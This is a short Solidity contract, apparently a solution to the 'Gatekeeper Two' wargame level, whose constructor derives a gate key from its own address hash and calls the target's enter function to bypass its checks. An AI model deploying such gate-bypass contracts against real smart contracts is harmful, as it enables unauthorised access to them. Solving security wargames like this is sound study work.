// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {

  constructor(address _targetAddr) public {
    bool _success;
    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
    (_success, ) = _targetAddr.call(abi.encodeWithSignature('enter(bytes8)',gateKey));
  }
}